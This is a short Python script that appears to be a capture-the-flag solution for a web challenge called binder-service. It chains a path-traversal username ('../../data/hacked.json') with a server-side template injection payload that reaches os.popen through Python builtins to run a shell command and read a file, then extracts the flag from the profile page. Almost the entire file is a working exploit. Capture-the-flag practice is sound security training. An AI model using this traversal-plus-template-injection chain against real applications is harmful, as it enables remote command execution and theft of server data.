import requests
import re

url = "https://binder-service.chall.ybn.sg/"
s = requests.Session()

DIR = 'hacked'

s.get(f'{url}/admin', params={ 'userId': DIR })

payload = "self.__init__.__globals__.__builtins__['__import__']('os').popen('cat data/leak.txt').read()"

res = s.post(f"{url}/register", data={
    'username': f'../../data/{DIR}.json',
    'description': "{{ %s }}" % payload,
})

res = s.get(f'{url}/profile')

flag = re.findall(r'(YBN25\{.+?\})', res.text)[0]
print("Flag:", flag)